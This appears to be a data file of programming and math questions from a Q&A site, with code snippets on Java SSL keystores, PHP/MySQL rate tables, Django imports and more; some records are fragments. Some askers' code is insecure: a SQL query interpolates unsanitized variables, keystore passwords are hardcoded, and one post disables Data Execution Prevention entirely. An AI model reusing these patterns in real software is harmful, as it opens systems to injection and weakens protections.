AppClientSideSocketNEW.jar, and this verify server hostname to make communication with the server. In this case, the CN used in the public certificate on the client side must be match with the hostname where AppServerSideSocket.jar are. Originally the connection was configured in this way on the server side: All the clients received the same publicKeyApp and connect with the server without verify hostname, so doesn't matter if the server where server socket application (AppServerSideSocket.jar) is installed in the server with hostname is badServer1.com and the CN of key in privateKeyApp and publicKeyApp is setted with goodServer1.com, because all the clients don't verify hostname or the CN attribute of the key. Bellow is showed a piece of this kind of connection But the new client (AppClientSideSocketNEW.jar) do this verification obligatorily, now is necessary provide a new certificate for this client with new value for CN attribute reflecting the correct hostname CN where the server socket is. I don't have access to second client and I'm sure that it do hostname verification. So I created two new key-pair certificates (privateKeyAppNew and publicKeyAppNew) and apparently the communications happened with success between the server using this new key-pair and new client using this new public publicKeyAppNew key, after configured the server to use this new key-pair of course. But I need continue to use the old key-pair for old clients. I'd like to know how can I deal with this. Using a keymanager let me able to verify the client certificate on the server app when client try to connect and choose the appropriate and do the handshake using the correct certificate? Or I need distinct ssl socket connection in different ports for which kind of clients?","['    KeyStore KeyStore1;\n\n                try {\n                    String keyStoreFile1 = ""privatekey1"";\n                    String keyStoreType1 = ""jks"";\n                    char[] keyStorePwd1 = ""password"".toCharArray();\n\n                    keyStore1 = KeyStore.getInstance(keyStoreType1);\n                    keyStore1.load(new FileInputStream(keyStoreFile1), keyStorePwd1);\n                } catch (java.security.GeneralSecurityException thr) {\n                    throw new IOException(""Cannot load keystore ("" + thr + "")"");\n                }\n\n                KeyStore trustStore1;\n\n                try {\n                    String trustStoreFile1 = ""publickey1"";\n                    String trustStoreType1 = ""jks"";\n                    char[] trustStorePwd1 = ""password"".toCharArray();\n\n                    trustStore1 = KeyStore.getInstance(trustStoreType1);\n                    trustStore.load(new FileInputStream(trustStoreFile1), trustStorePwd1);\n                } catch (java.security.GeneralSecurityException thr) {\n                    throw new IOException(""Cannot load truststore ("" + thr + "")"");\n                }\n\n\n                KeyStore keyStore2;\n\n                try {\n                    String keyStoreFile2 = ""privatekey2"";\n                    String keyStoreType2 = ""jks"";\n                    char[] keyStorePwd2 = ""anotherpass"".toCharArray();\n\n                    keyStore2 = KeyStore.getInstance(key2StoreType);\n                    keyStore2.load(new FileInputStream(keyStoreFile2), keyStorePwd2);\n                } catch (java.security.GeneralSecurityException thr) {\n                    throw new IOException(""Cannot load keystore ("" + thr + "")"");\n                }\n\n                KeyStore trustStore2;\n\n                try {\n                    String trustStoreFile2 = ""publickey2"";\n                    String trustStoreType2 = ""jks"";\n                    char[] trustStorePwd2 = ""anotherpass"".toCharArray();\n\n                    trustStore2 = KeyStore.getInstance(trustStoreType2);\n                    trustStore2.load(new FileInputStream(trustStoreFile2), trustStorePwd2);\n                } catch (java.security.GeneralSecurityException thr) {\n                    throw new IOException(""Cannot load truststore ("" + thr + "")"");\n                }\n\n\n\n                KeyManagerFactory kmfkey1 = KeyManagerFactory\n.getInstance(KeyManagerFactory.getkey1Algorithm());\n\n                kmfkey1.init(keyStore1, ""password"".toCharArray());\n\n                TrustManagerFactory tmfkey1 =\n                        TrustManagerFactory.getInstance(TrustManagerFactory.getkey1Algorithm());\n                tmfkey1.init(trustStore1);\n\n\n                SSLContext ctx = SSLContext.getInstance(""SSL"");\n                ctx.init(kmfkey1.getKeyManagers(), tmfkey1.getTrustManagers(), null);\n\n\n                KeyManagerFactory kmfkey2 =  KeyManagerFactory.\ngetInstance(KeyManagerFactory.getkey1Algorithm());\n\n                kmfkey2.init(keyStore2, ""password"".toCharArray());\n\n                TrustManagerFactory tmfkey2 =  TrustManagerFactory\n.getInstance(TrustManagerFactory.getkey1Algorithm());\n\n                tmfkey2.init(trustStore2);\n\n\n                SSLContext ctxkey2 = SSLContext.getInstance(""SSL"");\n                ctxkey2.init(kmfkey2.getKeyManagers(), tmfkey2.getTrustManagers(), null);\n\n                SSLServerSocketFactory sslSrvSockFact = (SSLServerSocketFactory) SSLServerSocketFactory.getDefault();\n\n                serverSocket = sslSrvSockFact.createServerSocket(port);\n', 'private KeyManager[] getKeyManagers() throws IOException, GeneralSecurityException {\n\n        // First, get the default KeyManagerFactory.\n        String alg = KeyManagerFactory.getDefaultAlgorithm();\n        KeyManagerFactory kmFact = KeyManagerFactory.getInstance(alg);\n\n        // Next, set up the KeyStore to use.

3811158,Scaling multiple paths with raphael,"I'm trying to use Raphael to create a map tool similar to this example in the webpage. I have an svg file of the map I want to use, and the provinces are all separate paths in the file. However, if I copy the coordinates form the svg file directly to a raphael path, the image is too large to fit the screen and therefore I need to scale it. I know I can use the scale function to scale all province paths individually, but then they will no longer be touching each other, and I'd have to move them around to reassemble the map. Is there a way to group the paths together and scale the whole thing, or is there some clever tool to scale the original svg file? Inkscape scaling doesn't seem to modify the coordinates in the svg file. Thanks.

3812542,Understanding the Analytic Continuation of the Gamma Function,"So my book proves the convergence of $\Gamma(z) = \int_0^{\infty}t^{z-1}e^{-t}dt$ in the right half plane $Re(z) &gt; 0$, and then goes on to prove the initial recurrence relation $\Gamma(z+1)=z\Gamma(z)$ by applying integration by parts to $\Gamma(z+1)$: $$\int_0^{\infty}t^{z}e^{-t}dt = -t^ze^{-t}|_0^{\infty} + z\int_0^{\infty}t^{z-1}e^{-t}dt$$ The book explicitly states this equality to be true only in the right half plane, since otherwise $-t^ze^{-t}|_0^{\infty} = \infty$, instead of equaling zero. With this initial recurrence relation we are 'supposably' able to analytically continue the Gamma function to $Re(z) &gt; -1$ (not including the origin) by writing the relation in the form: $$\Gamma(z) = \frac{\Gamma(z+1)}{z}$$ What I don't understand is this relation is still only true in the right half plane, since otherwise $-t^ze^{-t}|_0^{\infty}\neq 0$. I don't see what reason we have to believe that, for instance, $\Gamma(-\frac{1}{2}) = \frac{\Gamma(\frac{1}{2})}{-\frac{1}{2}}$. Furthermore $\int_0^{\infty}t^{z-1}e^{-t}dt$ is clearly not convergent in the left half plane, so I can't even imagine why it would be plausible to think that a recurrence relation directly based on it could possibly lead to a genuine analytic continuation of its domain.",[],False
3824092,ForEach loop not changing property of class,"I've seen a couple questions about this, and done some research. My understanding is that when you run a foreach on IEnumerable: if T is a Reference Type (e.g. Class) you should be able to modify properties of the object from within the loop. If T is a value type (e.g. Struct) this would not work since the iteration variable would be a local copy.

3866337,What's the most elegant way to get the end of the day (datetime)?,"UPDATE: I've added a solution to the bottom of this question. I'm currently writing some reporting code that allows users to optionally specify a date range. The way it works (simplified), is: A user (optionally) specifies a year. A user (optionally) specifies a month. A user (optionally) specifies a day. Here's a code snippet, along with comments describing what I'd like to do: I'm trying to find the most elegant way to write the code above--I've been trying to find a way to do it with timedelta, but can't seem to figure it out. Any advice would be appreciated. Thanks. EDIT, ADDING SOLUTION: After looking at some of the answers here, and not really finding anything extremely elegant, I did some poking around the standard library, and found my current solution (which I like quite well): dateutil. Here's how I implemented it: What I like about this implementation, is that python's dateutil.relativedata.relativedata works really well on edge cases. It gets the days/months/years correct. If I have month=12, and do relativedata(months=1), it'll increment the year and set the month to 1 (works nicely). Also: in the above implementation, if the user specifies none of the optional dates (year, month, or day)--we'll fallback to a nice default (start_time = this morning, stop_time = tonight), that way we'll default to doing stuff for the current day only.

3868905,Why does this particular Serre spectral sequence collapse at the $E_{k+2}$-page?,"The problem: Let $X$ be a product of equidimensional spheres of arbitrary dimension, say $k$, and $G$ a finite group acting freely on $X$. Assume that the induced $G$-action on the $Z_2$-cohomology ring of $X$ is trivial. We then have a Serre spectral sequence with the $E_2$-page given by the expression $H^*(G; H^*(X; Z_2))$ and converging to $H^*(X/G; Z_2)$. The first non-zero differential is certainly $d^{k+1}$. Let $M$ be the image of the transgression (hence $M$ is a subgroup of $H^{k+1}(G; Z_2))$. Now suppose that $M = 0$. How do I deduce that $E_{\infty} = E_{k+2} = E_2$? Background: I've been trying to learn some spectral sequences these past few days. After a while I had decided I kind of have a grasp of what is going on and have been trying to understand some research-level examples. The one described above comes from the paper Free compact group actions on products of spheres by R. Oliver. In fact, he takes G to be the alternating group on four letters, but I don't think this has anything to do with my question.

Video chat For a long time I've wanted a small computer to use for video chat with family members across the world, that I can situate next to the HDTV and with a wireless keyboard/mouse so I can video chat from the couch. To me this would be a no-brainer for the Mini; however I vaguely remember a rumor about the Mini's DVI port not having all the signals required to drive a HDMI port. Is this true? Any recommendations on the wireless keyboard? 2. Fileserver/Backup system I am also looking for a home-wide fileserver and backup solution. The configuration I have been thinking about is a ""box"" attached to the Mini with a set of fixed disks configured as a RAID setup for handling file serving and media center duties. In the box I also want at least one drive bay for a removable hard drive so I can do backups of the RAID system and move them offsite. So far I haven't found any single boxes that seems to fit those requirements and also plugs into firewire. I'm not too keen on plugging things into the Mini's USB ports other than keyboard/mouse.

3947241,Does the concept of shared sessions exist in ASP.NET?,"I am working on a web application (ASP.NET) game that would consist of a single page, and on that page, there would be a game board akin to Monopoly. I am trying to determine what the best architectural approach would be. The main requirements I have identified thus far are: Up to six users share a single game state object. The users need to keep (relatively) up to date on the current state of the game, i.e. whose turn it is, what did the active user just roll, how much money does each other user have, etc. I have thought about keeping the game state in a database, but it seems like overkill to keep updating the database when a game state object (say, in a cache) could be kept up to date. For example, the flow might go like this: Receive request for data from a user. Look up data in database. Create object from that data. Verify user has permissions to perform request based on the game's state (i.e. make sure it's really their turn or have enough money to buy that property). Update the game object. Write the game object back to the database. Repeat for every single request. Consider that a single server would be serving several concurrent games. I have thought about using AJAX to make requests to an an ASP.NET page. I have thought about using AJAX requests to a web service using silverlight. I have thought about using WCF duplex channels in silverlight. I can't figure out what the best approach is. All seem to have their drawbacks. Does anyone out there have experience with this sort of thing and care to share those experiences? Feel free to ask your own questions if I am being too ambiguous! Thanks.

4111275,onPeriodicNotification() has the jitters on *some* devices,"Why does onPeriodicNotification() behave so erratically? Background I'm working on an audio visualizer for Android that samples from the microphone using AudioRecord.read() (16-bit mono). I've done quite a bit of testing with sample rates and frame periods for setPositionNotificationPeriod(). In the end, I settled on: Sample Rate: 8000 Frame Period: Sample Rate * 41 / 1000 = 328 Buffer Size: 5 * Sample Rate The frame period is 41 ms which I chose because I want ~24 frames per second for my visualizer. I thought that drawing to canvas at this rate would be a problem at first, but after testing on the DroidX and Nexus One, I was getting amazing performance. I can drop the latency to 20 ms on these devices without buffer-overruns but have no need to. Once I started testing on the Galaxy S and Nexus S, my performance tanked. This seemed odd since the Nexus S outperforms both devices by a large degree. After eliminating drawing and calculations as being the problem, I put timing calls in onPeriodicNotification(). I was able to confirm that the issue is due to this callback being called at willy-nilly time intervals and I do not understand why. Creating a Fair Benchmark As a fair test, I took all of my audio processing and drawing out of the loop such that all my app does is read audio in a loop and log data in onPeriodicNotification(). I set the frame period to 100 ms and used the following timing code: Finally, I sampled data for 5-minutes on each device. On the DroidX, I get about what I expect: # Points: 3008 Min: 92 Max: 105 Avg: 100 StdDev: 6.64 This seems reasonable and I'm willing to live with this. On the Galaxy S, I get this: # Points: 3004 Min: 0! Max: 274 Avg: 100.05 StdDev: 126.30?!? With a StdDev of 126, this means that a subsequent set of timing calls often looks like this [253, 0, 1, 258, 1, 0, 263]. Conclusion &amp; other misc data While performing these tests, I kept an eye on CPU usage. My process hovers around 2-3% CPU usage with plenty of overhead to work with. I notice that if I increase the latency between notifications to around 250 ms, the Galaxy S begins behaving as I would expect (the stddev drops to around 6-7). Unfortunately, 250 ms is far from being a usable latency for audio visualization. After typing all this I can't help but feel this better belongs in some bug report, but then again this is Samsung we're talking about and we know they have no internet android bug reporting presence :( Alternatives, insights and experience are greatly appreciated.","['currentTime = SystemClock.elapsedRealtime();\nLog.v(TAG, ""time since last record update: "" + (currentTime - lastTime));\nlastTime = currentTime;\n']",False

4141033,Formtastic select with grouping,Now with Formtastic I have plain select: Here I show only children categories. I use acts_as_tree plugin for parent-child relationship. I would like to show parent categories as well. Formtastic generated select should look like this one: How to use grouping in Formtastic select for model with acts_as_tree functionality?

I have looked through formtastic.rb and found object_class in detect_group_association method: Indeed object_class undefined in this method and there is no privat method with that name in formtastic.rb.

4143246,Efficient representation of Hierarchies in Hibernate,"I'm having some trouble representing an object hierarchy in Hibernate. I've searched around, and haven't managed to find any examples doing this or similar - you have my apologies if this is a common question. I have two types which I'd like to persist using Hibernate: Groups and Items. * Groups are identified uniquely by a combination of their name and their parent. * The groups are arranged in a number of trees, such that every Group has zero or one parent Group. * Each Item can be a member of zero or more Groups. Ideally, I'd like a bi-directional relationship allowing me to get: * all Groups that an Item is a member of * all Items that are a member of a particular Group or its descendants. I also need to be able to traverse the Group tree from the top in order to display it on the UI. The basic object structure would ideally look like this: Originally, I had just made a simple bi-directional many-to-many relationship between Items and Groups, such that fetching all items in a group hierarchy required recursion down the tree, and fetching groups for an Item was a simple getter, i.e.: However, this resulted in multiple database requests to fetch the Items in a Group with many descendants, or for retrieving the entire Group tree to display in the UI. This seems very inefficient, especially with deeper, larger group trees. Is there a better or standard way of representing this relationship in Hibernate? Am I doing anything obviously wrong or stupid? My only other thought so far was this: Replace the group's id, parent and name fields with a unique ""path"" String which specifies the whole ancestry of a group, e.g.: /rootGroup /rootGroup/aChild /rootGroup/aChild/aGrandChild The join table between Groups and Items would then contain group_path and item_id. This immediately solves the two issues I was suffering previously: 1. The entire group hierarchy can be fetched from the database in a single query and reconstructed in-memory. 2. To retrieve all Items in a group or its descendants, we can select from group_item where group_path='N' or group_path like 'N/%' However, this seems to defeat the point of using Hibernate.

If I use the synchronous function receive_from everything works as expected. However if I use async_receive_from the handler is never called. Since I use a semaphore to detect that some data have been received, the program locks and the loop is never triggered. I have verified (with a network analyzer) that the sender device properly sends the data on the UDP socket. I have isolated the problem in the following code. A timed_wait on the semaphore is to be preferred, however for debug purposes I have used a blocking wait as in the code above. Did I miss something?

I would now like to add a (contact) form alongside the file upload, but I am unsure how to 'link' the form to the file uploads. So, my logic is that the user fills in the contact form, and then upload the files (and then obviously presses the ""submit""). My question (not sure if I am making this clear), is that how do I make a link between the contact form contents (such as name, email id etc..) to the files the user has uploaded using django-ajax-uploader. What would be the most efficient way to do this? If it helps, I plan to write the (contact) form using modelForms, which would obviously write the fields to the database. However, django-ajax-uploader does not use a db, and therefore, I am not sure how I could link the both.

4453140,"If a git pull keeps getting aborted partway through, will it eventually succeed?","I just started using SparkleShare to sync my documents between computers. SparkleShare uses Git for almost everything. My initial few commits are large: several gigabytes each. They got pushed to the Git server successfully. My home network is very flaky now, so my second computer is having a hard time completing the git pull: the network connection aborts partway through. My question: if the second computer keeps trying to pull a single giant changeset, will it eventually succeed? Is it a cumulative action, or does it lose its place when the network connection is aborted? From what little I know of Git's protocol, it seems that the pull makes overall progress each time it successfully downloads each blob (file). Commits are merely small files that point at the blobs. So I suspect that the second PC will eventually synchronize despite the flaky network, unless the network is so flaky that the PC never gets the opportunity to download a single blob in full.

4465704,Optimizing performance of Postgresql database writes in Django?,"I've got a Django 1.1 app that needs to import data from some big json files on a daily basis. To give an idea, one of these files is over 100 Mb and has 90K entries that are imported to a Postgresql database. The problem I'm experiencing is that it takes really a long time for the data to be imported, i.e. in the order of hours. I would have expected it would take some time to write that number of entries to the database, but certainly not that long, which makes me think I'm doing something inherently wrong. I've read similar stackexchange questions, and the solutions proposed suggest using or decorators to commit in batches instead of on every , which I'm already doing. As I say, I'm wondering if I'm doing anything wrong (e.g. batches to commit are too big?, too many foreign keys?...), or whether I should just go away from Django models for this function and use the DB API directly. Any ideas or suggestions? Here are the basic models I'm dealing with when importing data (I've removed some of the fields in the original code for the sake of simplicity) class Template(models.Model): template_name = models.TextField(_(""Name""), max_length=70) sourcepackage = models.TextField(_(""Source package""), max_length=70) translation_domain = models.TextField(_(""Domain""), max_length=70) total = models.IntegerField(_(""Total"")) enabled = models.BooleanField(_(""Enabled"")) priority = models.IntegerField(_(""Priority"")) release = models.ForeignKey(Release) class Translation(models.Model): release = models.ForeignKey(Release) template = models.ForeignKey(Template) language = models.ForeignKey(Language) translated = models.IntegerField(_(""Translated"")) And here's the bit of code that seems to take ages to complete: @transaction.commit_manually def add_translations(translation_data, lp_translation): releases = Release.objects.all() # There are 5 releases for release in releases: # translation_data has about 90K entries # this is the part that takes a long time for lp_translation in translation_data: try: language = Language.objects.get( code=lp_translation['language']) except Language.DoesNotExist: continue translation = Translation( template=Template.objects.get( sourcepackage=lp_translation['sourcepackage'], template_name=lp_translation['template_name'], translation_domain=\ lp_translation['translation_domain'], release=release), translated=lp_translation['translated'], language=language, release=release, ) translation.save() # I realize I should commit every n entries transaction.commit() # I've also got another bit of code to fill in some data I'm # not getting from the json files # Add missing templates languages = Language.objects.filter(visible=True) languages_total = len(languages) for language in languages: templates = Template.objects.filter(release=release) for template in templates: try: translation = Translation.objects.get( template=template, language=language, release=release) except Translation.DoesNotExist: translation = Translation(template=template, language=language, release=release, translated=0, untranslated=0) translation.save() transaction.commit()","['transaction.commit_manually', 'transaction.commit_on_success', '.save()']",True

I chose NetNamedPipe because it is the best and efficient choice for interprocess communication on the same machine. However, one of the key requirements of the application is that the UI should be able to send actions to the windows service and vice versa asynchronously. This means that the windows service should be able to call back the .NET UI application without the need for the .NET UI application to connect to the windows service first. Keeping this in mind, I have hosted a WCF service in the windows service and a separate WCF service in the .NET UI application so that they can communicate asynchronously without the need to keep the communication channel always alive.

However, mutagen requires a file as an input while I wish to input an mp3 frame or a series of such frames.

I'm using C# and ASP.NET to work with it using the Enyim libraries. I currently suspect that the application does not have enough connections per the socketPool setting in my app.config. I also noted that the previous developer's code simply treats ANY exception from an attempted Get call to MemCache as if the item isn't in the cache, which (I believe) may be resulting in periodic spikes in calls to the database when the pool gets starved. We've been having oddball load spikes that don't seem to have any relation to server load. I suspect that he is not correctly managing the lifecycle on the connections to Northscale and that we are periodically experiencing starvation in the socket pool as a result, but I'm unable to prove it. Is there a specific exception I should be looking for when I call the Get method to retrieve items from cache? I'm not really seeing much in the docs that gives me sufficient information on this. Anybody have any sample code on this? I'd even accept java or php code, as I think the .NET libraries were probably based on one of those anyway. Any ideas? Thanks, Will",[],False

4697332,Django: Converting an entire set of a Model's objects into a single dictionary,"If you came here from Google looking for model to dict, skip my question, and just jump down to the first answer. My question will only confuse you. Is there a good way in Django to entire set of a Model's objects into a single dictionary? I mean, like this: ... with the result being a dictionary with the key/value pairs made up of records in the Model? Has anyone else seen this as being useful for them? Thanks. Update I just wanted to add is that my ultimate goal is to be able to do a simple variable lookup inside a Template. Something like: With a result of DictModel.objects.get(key__exact=exampleKey).value Overall, though, you guys have really surprised me with how helpful allof your responses are, and how different the ways to approach it can be. Thanks a lot. Update October 2011: This question is the top result if you Google ""django model_to_dict"", which is actually pretty awful given that it solves a different problem than what I was asking. What I wanted was to be able to map all of the instances in a queryset into a single dictionary with a specified model field as the key. model_to_dict, on the other hand converts a single model instance into a dictionary. Now, my needs at the time were pretty darn specific, and probably extremely rare (I can't even remember the project I needed it for, or why). So I would be pretty surprised that anyone looking for information about model_to_dict is going to find my question actually useful.

Currently, I have defined simple instructions like , , , etc. But I also have a function that executes arguments in sequence. The problem I am having is that because can execute instructions in sequence, it means an ant can do multiple actions in a single time step. Unlike nature, I cannot run the ants in parallel, meaning one ant might go and perform several actions, manipulating the environment whilst all of the other ants are waiting to have their turn. I'm just wondering, is this how it is normally done, or is there a better way? Koza does not seem to mention anything about it. Thing is, I want to expand the scenario to have other agents (e.g. enemies), which might rely on things occurring only once in a single time step.","['MOVE-ONE-STEP', 'TURN-LEFT', 'TURN-RIGHT', 'PROGN', 'PROGN']",False

Is there a way that I can, within the lowest function, declare variables in the scope of the function that called it? So FPX::contract() needs to be able to set variables that are in the scope of doSomething() so that I don't have to declare each of these variables. (I don't want to declare globals). Ideally it would just look like: And then doSomething() would be able to access each of the variables listed in the contract as $length, $width, etc. I'm aware of the function($var0, $var1, $var2=null) syntax, but it's not very easy to use this syntax with a large number of optional variables. Thanks, Ken","['function doSomething($param_arr){\n    FPX::contract(array(\n        \'required\' =&gt; array(""length"", ""width"", ""height"", ""weight""),\n        \'optional\' =&gt; array(""circumference"")\n    ));\n    $length = $parr[\'length\'];\n    $width = $parr[\'width\'];\n    $height = $parr[\'height\'];\n    $weight = $parr[\'weight\'];\n    $circumference = $parr[\'circumference\'];\n    ....\n}\n', 'function doSomething($param_arr){\n        FPX::contract(array(\n            \'required\' =&gt; array(""length"", ""width"", ""height"", ""weight""),\n            \'optional\' =&gt; array(""circumference"")\n        ));\n    ....\n}\n']",False

4864205,Windows Server 2008 - copy imaging backups to multiple devices?,"I want to use the new block level incremental imaging capabilities of Server 2008 for my primary backup. Specifically, I'm backing up Hyper-V R2 and guests from the host. Thus my backups mostly consist of large VHD files from the guest systems. What I like about imaging is that I can keep a long history of backups without using a lot of disk space. File replication techniques using SIS are less ideal because the bulk of my backups are large VHD files. So anyway, I've got backups using imaging working fine. What I want to do now is have multiple copies of my backups; one to direct attached storage, one to an iSCSI target, and one to removable media. It is my understanding that windows imaging backups are not ""copyable"". I believe this means that I can't copy backup history, and if I copy the backup files from the destination device to another device, I may not be able to restore (easily) from the copy. Is there a way to mirror or replicate these backups so that I can have two or more copies of the backup image, with history, that I can easily restore?",[],False

I only want to return 5 different ones, but the issue is some companies don't offer all 5 of those plans, so in this instance when I'm outputting the array, the rate for a certain plan will line up in the wrong column in the table. Basically, I don't know how to align the data correctly in the specific column it should be in. In a scenario where a plan A, F, and N are only available for the company, it will fill the first three fields, and the rate for plan N will not line up in the plan N column. I need to figure out how to associate a given rate with the Plan letter, and output it correctly in the table. In the instance below Plan A rate is $111.40, Plan F is 135.37 and Plan N rate is $96.52. As you see, the Plan N rate is not aligning correctly. How do I go about fixing this? Table output: This is what I'm using to output the array in PHP:","[""SELECT data.Monthly_Rate, zips.ZIP_LOOKUP_CODE AS Expr1, zips.State, zips.County, zips.City, zips.Zipcode\nFROM data INNER JOIN\nzips ON data.ZIP_LOOKUP_CODE = zips.ZIP_LOOKUP_CODE\nWHERE (zips.Zipcode = '$zipcode') AND \n(data.Company_Old LIKE '%Blue Cross%') AND\n(data.Plan IN ('A','F','F (High)','G','N')) AND \n(data.Gender = '$gender') AND \n(data.Age = '$age') AND \n(data.Tobacco = '$tobacco') AND \n(data.State = '$state');\n"", 'while($row = mysql_fetch_array($PlanRates))\n{   \n$Plan = ""$"" . number_format($row[\'Monthly_Rate\'], 2, \'.\', \'\');\necho ""&lt;td align=\'center\'&gt;$Plan&lt;/td&gt;"";           \n}\necho ""&lt;/tr&gt;"";\nmysql_free_result($PlanRates);\n']",False

4943950,Rings of integers are noetherian (question about a specific proof),"I'm reading Neukirch's book about Algebraic number theory and I totally fail to understand something. At one point he proves that the ring of integers $\mathcal{O}_K$ of a number field $K$ is noetherian in the following manner: ""every ideal is a finitely generated $\mathbb{Z}$-module by (2.10) and therefore a fortiori a finitely generated $\mathcal{O}_K$-module."" Now 2.10 is the claim that for an integrally closed, principle ideal domain A, F its field of fractions, L a finite separable extension of F and B the integral closure of A in L, we have that ""every finitely generated B-submodule $M\ne 0$ of L is a free A-module of rank $[L:F]$"". I fail to see how 2.10 is used here. I guess in our case $F=\mathbb{Q}, L=K, A=\mathbb{Z}, B=\mathcal{O}_K$. So I know that every finitely generated $\mathcal{O}_K$ submodule (in other words, ideal) is a free $\mathbb{Z}$-module, which is additional information; but how can I assume that the ideal is finitely generated in the first place? That's what I need to prove!",[],False

My question involves the best way to draw a grid of rectangle shaped objects to the screen. I need each object displayed in the grid to have an initial text (or an int as text) value, and when a user touches that object, the text will change to a colored shape. Also, each object needs to be aware of (or be able to find out) the state of its immediate neighbors. I don't know which class to extend in order to be able to have both text and shapes display on it, and be able to handle touch input. Thank you for the help. Edit: I apologize, but I don't know how to be more clear. Perhaps some context will help.

The user needs to select a series of grid spots and a certain number of those spots that the user chose will change from the random number to a colored shape.

5005717,"Inside exception handler, MessageBox() successfully returns IDOK but never shows","I'm using a self written exception class called windows_error that inherits from std::runtime_error, which I use to, well, properly handle unexpected errors from Windows API functions. All the way on the bottom of the callstack, at the end of my WinMain function, I catch all windows_error exceptions that haven't been dealt with yet. I intend to handle them by display an error message right before the program terminates, like so: The basicHandler member function looks like this: When I started out with the program I'm working on, this worked beautifully. But now the program is starting to grow. While trying out new code I noticed the program seemed to terminate unexpectedly. By running it in the Visual C++ 2010 debugger, I noticed a windows_error exception being thrown. By stepping through the basicHandler function, I could see that the MessageBox function returns 1 (IDOK) without actually showing the message box... What could cause this behavior? I know my description is a little vague, but I have no idea what else to add... I couldn't find anything on MSDN that would suggest this behavior is even possible. There is no parent window handle I could pass to MessageBox, since they're all being destroyed during stack unwinding. I'm also positive that the stack is not unwound through a window procedure or any other Windows callback.

5024980,Item control to delete itself from container control,"There's a container control, a TScrollBox, that parents multiple item controls. Every item control, being compound itself, contains (parents &amp; owns) a delete button. Pressing the button initiates the deleting of the item control. The deleting involves freeing the component and so the actual operation should be extrinsic with regard to the item. The question is, what would be the best way to do it? I actually know of a couple of options: a timer with a small interval (which is started with the button click); a hidden outside button (to which the mouse down &amp; up messages are posted); the form's custom message handler. While I could confidently implement any of those methods, as I flatter myself, I'm not sure which one would be best. Besides, the timer option seems childish, the hidden button one hackish, and the custom message one a bit overkill. In short, all three seem equally half-acceptable, more or less. I may simply be prejudiced and don't mind being convinced to the contrary. Still most of all I would like to know what is a common method to use in such cases (maybe something I've been missing all the time).",[],False

In some client/server instances like games the server is an interpreter for actions to be taken, can you design a protocol as to elegantly cooperate with such a design pattern? Is there a design pattern designed for client/server applications. I was also thinking maybe a modified producer consumer pattern?

5157354,Indexing Service + MODI = Full-text over OCR? You wish,"Scenario: You have configured Indexing Service to index your files, which also include scanned images saved as hi-res TIFF files. You also have installed MS Office 2003+ and configured MS Office Document Imaging (MODI) correctly so you can perform OCR on your images and even embed the OCR'd text into TIFFs. Awesomeness: Indexing Service is able to index and find those TIFFs that you manually OCR'd and re-saved with text data (using MS Document Imaging tool). Suck(TM): Whatever you do, you cannot make the Indexing Service OCR and index the TIFF files without text data. You scour the web, find out how to turn on MODI debugging, and see that CISVC is calling MODI but somehow nothing seems to happen. Hack: Turns out, Data Execution Prevention (DEP) which is deployed with Windows XP SP2 thinks MODI is malicious and refuses to let it do its magic. I have been able to remove the Suck(TM) by turning DEP off completely, but (even though DEP hasn't yet saved my posterior that I can remember) I found this solution to be inelegant (read: the customer's IT manager's gonna fry you, if xe hears about it).

5204940,Adding a compilation time stamp ONLY when changes occurred in the project (C),"I'm currently in a process of creating a new C project and I have encountered a need to stamp each compilation with some data (including time &amp; date). The standard and trivial way to do it is to either: Generate a .c file through a simple script, adding the needed information. With this solution the project will always generate a new artifact (.o for example), even when no changes occurred in the project itself (none of the files were changed). Have a .c file ready already, with time , date and other stuff if needed, compiling it only after cleaning the project. Changes to source or header files in the project will not cause the stamp to be changed (unless we clean the project first). What I am looking for is something in between: When the project files change, and only then, make sure to add the compilation stamp.",[],False
5216794,Endianness in Unix hexdump,"The following *nix command pipes a hex representation of an IP and port (127.0.0.1:80) into the hexdump command. The -e flag allows an arbitrary format to parse the input. In this case, we are parsing the first three octets of the IP into unsigned decimals followed by a dot. The final octet is also parsed into an unsigned decimal but it is followed by a colon. Finally -- and this is where the problem lies -- the 2 bytes for the port are parsed as a single unsigned decimal followed by a newline. Depending on the endianness of the system executing this command, the result will differ. A big-endian system will properly show port 80; whereas a little-endian system will show port 20480. Is there any way to manipulate hexdump to be aware of endianness while still allowing the arbitrary format specification via -e?","['printf ""\\x7F\\x00\\x00\\x01\\x00\\x50"" | hexdump -e \'3/1 ""%u."" /1 ""%u:"" 1/2 ""%u"" ""\\n""\'\n']",False

5317192,Timer problem with GDI+,"I am currently stuck at a really strange problem with GDI and timers. First the Code: I am trying here to move a painted graph in a specific time to 1 ""graph unit"" to the left. So i use a timer which will change the offset in little steps, so it will be a smooth moving (thats the refreshRate for). At the first view this code worked, but later i found following problem: If i am using a refreshRate of 1 (1Hz) it will just fine move my graph in 1 step 1 (graph unit) to the left. If i am increasing the refreshRate my movement will slow done. At 20 FPS its slighly slow, at 200 FPS its really slow.. So here is what i tried: I used Refresh or Update instead of Invalidate I used a normal Thread (with Sleep) instead of the timer Both code changes didnt changed the result.. Beside the movement with the timer I also can move the graph with my mouse and if the timer is running i can still smoothly move the graph with my mouse. So its not a peformance problem.. I thought of a problem in the painting queue, because I am refreshing faster than the painting is done? (But why can I sill move the graph smoothly with my mouse?!) So i need a little help here.

In various assembly languages, what you would do is include or import something like ""windows.lib"" or ""windows.inc"" or similar. The problem is, this varies from assembler to assembler and even the output (binary) looks different; I can't figure it out. So my general question is: How does calling an API method from a DLL library look like in the binary version as in a Windows PE file?

However when I powered on the machine it was automatically using the default VLAN which is connected to the live network. Because running under VMware effectively changed the ""hardware"" of the machine, this resulted in a change of the network adapter so I lost the static IPs and it picked up a new IP from the live network. I can only imagine that this screwed up DNS, AD and Exchange. So I created a new VLAN which holds a 'local only' network, configured IP as before but now Exchange cannot start. I keep getting 1053 errors (service cannot start in a timely fashion). I see nothing relevant in the event viewer. I have a gut feeling it is a DNS problem, but the settings looks fine to me.

I assumed that if they can create/own a database, they can do whatever they want to it, but there must be something they don't have access to. Any advise? Do I need to grant them permissions beyond ""create database""? Is there some common/standard set of stored procedures they should have access to?

